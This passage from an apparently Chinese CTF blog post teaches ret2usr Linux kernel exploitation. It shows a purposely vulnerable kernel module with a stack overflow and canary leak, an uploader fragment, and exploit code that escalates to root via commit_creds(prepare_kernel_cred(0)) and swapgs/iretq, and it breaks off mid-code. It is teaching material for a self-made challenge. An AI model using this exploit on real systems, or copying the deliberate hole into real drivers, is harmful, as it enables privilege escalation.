/tmp/benc | base64 -d &gt; /tmp/exp&quot;</span>)</span><br><span class="line">    exec_cmd(<span class="string">&quot;chmod +x /tmp/exp&quot;</span>)</span><br><span class="line">upload(<span class="string">&#x27;infect&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="kernel-test-æœ¬æ¬¡èµ„æºåˆé›†ï¼ŒåŒ…æ‹¬æºç ï¼ŒEXPï¼ŒdockerğŸ§¬"><a href="#kernel-test-æœ¬æ¬¡èµ„æºåˆé›†ï¼ŒåŒ…æ‹¬æºç ï¼ŒEXPï¼ŒdockerğŸ§¬" class="headerlink" title="kernel-test æœ¬æ¬¡èµ„æºåˆé›†ï¼ŒåŒ…æ‹¬æºç ï¼ŒEXPï¼ŒdockerğŸ§¬"></a>kernel-test æœ¬æ¬¡èµ„æºåˆé›†ï¼ŒåŒ…æ‹¬æºç ï¼ŒEXPï¼ŒdockerğŸ§¬</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps://pan.baidu.com/s/1h7xSB1qJp5s3MsoOCWUDig?pwd=2v64 </span><br><span class="line">æå–ç ï¼š2v64 </span><br><span class="line">--æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜V4çš„åˆ†äº«</span><br></pre></td></tr></table></figure>

<h4 id="Ret2usr"><a href="#Ret2usr" class="headerlink" title="Ret2usr"></a>Ret2usr</h4><p>è¿™ç§æŠ€æœ¯å·²ç»å¾ˆè€äº†è€Œä¸”å¾ˆå¥½é˜²èŒƒå¼€å¯smepç›´æ¥å¯„äº†ï¼Œä½†æ˜¯çœŸçš„å¾ˆå¥½ç”¨ï¼Œæ–¹ä¾¿ï¼Œä¸ç”¨æ‰¾gadgetä¸ç”¨æ§åˆ¶bpï¼Œspå¯„å­˜å™¨</p>
<p>ç½‘ä¸Šå·²ç»æœ‰äº†å¾ˆå¤šå¾ˆå¤šçš„å®˜æ–¹é˜è¿°ï¼Œæˆ‘è¿™é‡Œåªåšé€šä¿—ç†è§£ã€‚</p>
<h4 id="ç®€æ˜“è®²è§£"><a href="#ç®€æ˜“è®²è§£" class="headerlink" title="ç®€æ˜“è®²è§£"></a>ç®€æ˜“è®²è§£</h4><p>å¯¹äºæ“ä½œç³»ç»Ÿï¼Œæˆ‘ä»¬éƒ½çŸ¥é“å­˜åœ¨ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Œé©±åŠ¨æŒ‚è½½æ˜¯åœ¨å†…æ ¸æ€é‡Œé¢è·‘æ±‡ç¼–çš„ï¼Œæ™®é€šäºŒè¿›åˆ¶ç¨‹åºæ˜¯åœ¨ç”¨æˆ·æ€é‡Œè·‘çš„ã€‚</p>
<p>å¦‚æœqemuæ²¡æœ‰å¼€å¯kvm64ï¼Œkvm64 +smepéƒ½å¯ä»¥åœ¨ç”¨æˆ·æ€ä»£ç ç©ºé—´å»æ‰§è¡Œä»»æ„ä»£ç ã€‚é€šä¿—è®²smepå°±æ˜¯ç›¸å½“äºå¹³å¸¸é¢˜ç›®çš„NXã€‚</p>
<p>æ€è·¯å¾ˆç®€å•ï¼Œç”¨æˆ·æ‰“å¼€é©±åŠ¨ï¼Œç”¨äº¤äº’æ¨¡å—å»åˆ©ç”¨æ¼æ´ã€‚æ¯”å¦‚æº¢å‡ºï¼Œç”¨readæ³„éœ²canaryï¼Œwriteæ„é€ ropã€‚</p>
<p>æ§åˆ¶ripä»å†…æ ¸æ€è·³è½¬åˆ°ç”¨æˆ·æ€ï¼Œæ‰§è¡Œæˆ‘ä»¬expä¸­å†™å¥½äº†çš„ææƒå‡½æ•°ã€‚</p>
<p>å…¶å®ä¸ç”¨æŠŠå†…æ ¸é©±åŠ¨çœ‹çš„å¤šç¥ç§˜ï¼Œè¯´ç™½äº†æœ¬è´¨ä¸Šè¿˜æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåªæ˜¯ä»£ç æ‰§è¡ŒåŒºæ®µæœ‰åŒºåˆ†ï¼Œæœ‰ä¸åŒçš„ä¿æŠ¤æœºåˆ¶ï¼Œå †æ ˆä¸Šæœ¬è´¨çš„ç‰¹æ€§ä¸ä¼šå˜çš„ã€‚ä¸è¿‡éšç€GCCå’Œå†…æ ¸ç‰ˆæœ¬æé«˜ï¼Œå¾ˆå¤šgadgetå·²ç»æ¶ˆå¤±äº†ï¼Œå¸¸è§çš„ropæ‰‹æ³•å’Œæ ˆè¿ç§»æ‰‹æ³•åŸºæœ¬ä¸Šç®—æ˜¯å¯„äº†</p>
<p>è¿™é‡Œç®€å•è®²ä¸‹è‡ªå·±å‡ºçš„è¿™ä¸ªä¾‹é¢˜</p>
<h4 id="æºç -2"><a href="#æºç -2" class="headerlink" title="æºç "></a>æºç </h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>    <span class="comment">// included for all kernel modules</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>    <span class="comment">// included for KERN_INFO</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>      <span class="comment">// included for __init and __exit macros</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/scpi_protocol.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span>        <span class="comment">// file_operation is defined in this header</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;HRP&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;An easy kernel attack!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span>      majorNumber;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span>   <span class="keyword">class</span>*  <span class="title">HRP_module_class</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span>   <span class="title">device</span>* <span class="title">HRP_module_device</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;test&quot;</span>      <span class="comment">//define device name</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLASS_NAME  <span class="string">&quot;HRP_module&quot;</span></span></span><br><span class="line"><span class="type">char</span> pwn[<span class="number">0x300</span>]=<span class="string">&quot;flag&#123;I_am_flag_!&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡½æ•°åŸå‹</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">HRP_module_ioctl</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">HRP_init</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">HRP_exit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">HRP_module_write</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">HRP_module_read</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">///linux/fs.hä¸­çš„file_operationsç»“æ„ä½“åˆ—å‡ºäº†æ‰€æœ‰æ“ä½œç³»ç»Ÿå…è®¸çš„å¯¹è®¾å¤‡æ–‡ä»¶çš„æ“ä½œã€‚åœ¨æˆ‘ä»¬çš„é©±åŠ¨ä¸­ï¼Œéœ€è¦å°†å…¶ä¸­éœ€è¦çš„å‡½æ•°è¿›è¡Œå®ç°ã€‚ä¸‹é¢è¿™ä¸ªç»“æ„ä½“å°±æ˜¯å‘æ“ä½œç³»ç»Ÿå£°æ˜ï¼Œé‚£äº›è§„å®šå¥½çš„æ“ä½œåœ¨æœ¬æ¨¡å—é‡Œæ˜¯ç”±å“ªä¸ªå‡½æ•°å®ç°çš„ã€‚ä¾‹å¦‚ä¸‹æ–‡å°±è¡¨ç¤ºunlocked_ioctlæ˜¯ç”±æœ¬æ¨¡å—ä¸­çš„HRP_module_ioctl()å‡½æ•°å®ç°çš„ã€‚</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">HRP_module_fo</span> =</span> &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .unlocked_ioctl = HRP_module_ioctl,</span><br><span class="line">        .write=HRP_module_write,</span><br><span class="line">        .read=HRP_module_read,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœ¬æ¨¡å—ioctlå›è°ƒå‡½æ•°çš„å®ç°</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">HRP_module_write</span> <span class="params">(<span class="keyword">struct</span> file * file, <span class="type">const</span> <span class="type">char</span> __user * user, <span class="type">size_t</span> size, <span class="type">loff_t</span> * p)</span></span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;USE MY write\n&quot;</span>);</span><br><span class="line">    copy_from_user(pwn,user, size);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">114514</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">HRP_module_read</span> <span class="params">(<span class="keyword">struct</span> file * file, <span class="type">char</span> __user * user , <span class="type">size_t</span> size, <span class="type">loff_t</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> this_buf[<span class="number">0x40</span>]=<span class="string">&quot;welcome to my house\n&quot;</span>;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;USE MY read\n&quot;</span>);</span><br><span class="line">    copy_to_user(user,&amp;this_buf[size],<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">114514</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">HRP_module_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file,        <span class="comment">/* ditto */</span></span></span><br><span class="line"><span class="params">                 <span class="type">unsigned</span> <span class="type">int</span> cmd,      <span class="comment">/* number and param for ioctl */</span></span></span><br><span class="line"><span class="params">                 <span class="type">unsigned</span> <span class="type">long</span> param)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/* ioctlå›è°ƒå‡½æ•°ä¸­ä¸€èˆ¬éƒ½ä½¿ç”¨switchç»“æ„æ¥å¤„ç†ä¸åŒçš„è¾“å…¥å‚æ•°ï¼ˆcmdï¼‰ */</span></span><br><span class="line">        <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="type">char</span> leak[<span class="number">0x10</span>]=<span class="string">&quot;NONO!&quot;</span>;</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[HRPModule:] NOTHING! %s\n&quot;</span>,leak);</span><br><span class="line">                 __asm__(</span><br><span class="line">                <span class="string">&quot;mov $0x100,%rcx;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov $pwn,%rsi;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov %rsp,%rdi;&quot;</span></span><br><span class="line">                <span class="string">&quot;xor %eax,%eax;&quot;</span></span><br><span class="line">                <span class="string">&quot;rep movsb;&quot;</span></span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[HRPModule:] Unknown ioctl cmd!\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">HRP_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[HRPModule:] Entering HRP module. \n&quot;</span>);</span><br><span class="line">        <span class="comment">// åœ¨åŠ è½½æœ¬æ¨¡å—æ—¶ï¼Œé¦–å…ˆå‘æ“ä½œç³»ç»Ÿæ³¨å†Œä¸€ä¸ªchrdevï¼Œä¹Ÿå³å­—èŠ‚è®¾å¤‡ï¼Œä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸ºï¼šä¸»è®¾å¤‡å·ï¼ˆå¡«å†™0å³ä¸ºç­‰å¾…ç³»ç»Ÿåˆ†é…ï¼‰ï¼Œè®¾å¤‡åç§°ä»¥åŠfile_operationçš„ç»“æ„ä½“ã€‚è¿”å›å€¼ä¸ºç³»ç»Ÿåˆ†é…çš„ä¸»è®¾å¤‡å·ã€‚</span></span><br><span class="line">        majorNumber = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;HRP_module_fo);</span><br><span class="line">        <span class="keyword">if</span>(majorNumber &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[HRPModule:] Failed to register a major number. \n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> majorNumber;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[HRPModule:] Successful to register a major number %d. \n&quot;</span>, majorNumber);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ¥ä¸‹æ¥ï¼Œæ³¨å†Œè®¾å¤‡ç±»</span></span><br><span class="line">        HRP_module_class = class_create(THIS_MODULE, CLASS_NAME);</span><br><span class="line">        <span class="keyword">if</span>(IS_ERR(HRP_module_class))&#123;</span><br><span class="line">                unregister_chrdev(majorNumber, DEVICE_NAME);</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[HRPModule:] Class device register failed!\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> PTR_ERR(HRP_module_class);</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[HRPModule:] Class device register success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æœ€åï¼Œä½¿ç”¨device_createå‡½æ•°æ³¨å†Œè®¾å¤‡é©±åŠ¨</span></span><br><span class="line">        HRP_module_device = device_create(HRP_module_class, <span class="literal">NULL</span>, MKDEV(majorNumber, <span class="number">0</span>), <span class="literal">NULL</span>, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(HRP_module_device))&#123;               <span class="comment">// Clean up if there is an error</span></span><br><span class="line">                class_destroy(HRP_module_class);           <span class="comment">// Repeated code but the alternative is goto statements</span></span><br><span class="line">                unregister_chrdev(majorNumber, DEVICE_NAME);</span><br><span class="line">                printk(KERN_ALERT <span class="string">&quot;Failed to create the device\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> PTR_ERR(HRP_module_device);</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[HRPModule:] HRP module register successful. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">HRP_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">//é€€å‡ºæ—¶ï¼Œä¾æ¬¡æ¸…ç†ç”Ÿæˆçš„device, classå’Œchrdevã€‚è¿™æ ·å°±å°†ç³»ç»Ÿ/devä¸‹çš„è®¾å¤‡æ–‡ä»¶åˆ é™¤ï¼Œå¹¶è‡ªåŠ¨æ³¨é”€äº†/proc/devicesçš„è®¾å¤‡ã€‚</span></span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[HRPModule:] Start to clean up module.\n&quot;</span>);</span><br><span class="line">        device_destroy(HRP_module_class, MKDEV(majorNumber, <span class="number">0</span>));</span><br><span class="line">        class_destroy(HRP_module_class);</span><br><span class="line">        unregister_chrdev(majorNumber, DEVICE_NAME);</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[HRPModule:] Clean up successful. Bye.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(HRP_init);</span><br><span class="line">module_exit(HRP_exit);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="é‡ç‚¹"><a href="#é‡ç‚¹" class="headerlink" title="é‡ç‚¹"></a>é‡ç‚¹</h4><p>è¿™é‡Œæ˜¯æ„é€ qmemcpyè¿›è¡Œæº¢å‡ºï¼Œè¿™ä¸ªå†…å­˜å¤åˆ¶æ“ä½œåªæœ‰æ±‡ç¼–èƒ½å®Œæˆè¿™æ ·çš„æº¢å‡ºï¼Œæ™®é€šçš„strcpyï¼Œmemcpyä¼šè¢«GCCç¼–è¯‘çš„æ—¶å€™åœ¨å‡½æ•°é‡Œç›´æ¥å¼ºå¡æ£€æµ‹å‡½æ•°ï¼Œæœç»äº†æº¢å‡ºæ“ä½œï¼Œæ‰€ä»¥åœ¨ç°å®ä¸­ï¼ŒçœŸæœ‰è¿™ä¹ˆæ“è›‹çš„æº¢å‡ºåŸºæœ¬ä¸Šæ˜¯ä¸å¯èƒ½çš„ï¼Œåªæ˜¯ä¸ºäº†å­¦ä¹ ç ”ç©¶ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">                <span class="string">&quot;mov $0x100,%rcx;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov $pwn,%rsi;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov %rsp,%rdi;&quot;</span></span><br><span class="line">                <span class="string">&quot;xor %eax,%eax;&quot;</span></span><br><span class="line">                <span class="string">&quot;rep movsb;&quot;</span></span><br><span class="line">                );</span><br></pre></td></tr></table></figure>

<h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p>å…ˆçœ‹readå‡½æ•°ï¼Œæ³„éœ²canary</p>
<p>è¿™é‡Œcopy_to_userå¯ä»¥æŠŠå†…æ ¸ç©ºé—´çš„æ•°æ®ç»™åˆ°ç”¨æˆ·ï¼Œå¤§å°é™åˆ¶å›ºå®š0x40ï¼Œåˆšå¥½bufæ•°ç»„å¤§å°ä¹Ÿæ˜¯0x40ï¼Œæ‰€ä»¥åœ¨EXPé‡Œé¢åˆ°æ—¶å€™readå›æ¥çš„æ—¶å€™ä¸‹æ ‡ä¸º0çš„åœ°æ–¹å°±æ˜¯canaryäº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">HRP_module_read</span> <span class="params">(<span class="keyword">struct</span> file * file, <span class="type">char</span> __user * user , <span class="type">size_t</span> size, <span class="type">loff_t</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> this_buf[<span class="number">0x40</span>]=<span class="string">&quot;welcome to my house\n&quot;</span>;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;USE MY read\n&quot;</span>);</span><br><span class="line">    copy_to_user(user,&amp;this_buf[size],<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">114514</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>writeå‡½æ•°å¯ä»¥æŠŠç”¨æˆ·çš„æ•°æ®ç»™åˆ°å†…æ ¸ä¸­ï¼Œè¿™é‡Œæ˜¯ä¿å­˜åœ¨BSSæ®µä¸Š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">HRP_module_write</span> <span class="params">(<span class="keyword">struct</span> file * file, <span class="type">const</span> <span class="type">char</span> __user * user, <span class="type">size_t</span> size, <span class="type">loff_t</span> * p)</span></span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;USE MY write\n&quot;</span>);</span><br><span class="line">    copy_from_user(pwn,user, size);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">114514</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»“åˆioctlä¸­çš„å†…å­˜å¤åˆ¶æ“ä½œï¼Œå¯ä»¥é€ æˆå¾ˆå¤§çš„æº¢å‡ºã€‚</p>
<p>è¿™æ ·æ€è·¯å°±å¾ˆç®€å•çš„ï¼Œå¡«å……canaryï¼Œå¡«å……ç”¨æˆ·æ€åˆ©ç”¨å‡½æ•°åœ°å€å°±è¡Œäº†ã€‚</p>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><p>æˆ‘å¼€å¯äº†åŠ¨æ€åœ°å€éšæœºåŒ–ï¼Œæ‰€ä»¥åœ¨initæå‰ä¿å­˜äº†ä¹ æƒ¯åœ°å€ï¼Œç»™é€‰æ‰‹ç”¨æ¥è®¡ç®—åç§»ï¼Œfind_symbolså‡½æ•°å°±æ˜¯è®¡ç®—offsetå’Œå¯»æ‰¾çœŸå®åœ°å€çš„</p>
<p>save_statuså‡½æ•°æ˜¯ç”¨æ¥ä¿å­˜ç”¨æˆ·æ€çš„æ ˆæƒ…å†µçš„ï¼Œä»å†…æ ¸åˆ°ç”¨æˆ·æ€çš„è¿‡ç¨‹ä¸­ï¼Œæ ˆæƒ…å†µæ˜¯å†…æ ¸çš„ï¼Œå¦‚æœæœ€åè¿”å›åˆ°ç”¨æˆ·æ€æ‰§è¡Œå®Œäº†ä»£ç ä½†æ˜¯å’©æœ‰è¿˜åŸåˆ°ç”¨æˆ·æ€çš„æ ˆï¼Œä½ æ‰§è¡Œäº†ä¹Ÿæ²¡ç”¨çš„è¿˜æ˜¯shæ˜¯ä¸ä¼šè¿”å›ç»™ä½ çš„ã€‚</p>
<p>getå‡½æ•°ç”¨æ¥ä¿®æ”¹uidçš„ï¼Œæ‰§è¡Œcommit_creds(prepare_kernel_cred(0))ä¿®æ”¹UIDåˆ°rootï¼Œä¸‹é¢çš„æ±‡ç¼–å°±æ˜¯ç”¨æ¥åˆ‡æ¢åˆ°ç”¨æˆ·æ€å¹¶ä¸”æ‰§è¡Œshell çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push $shell;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 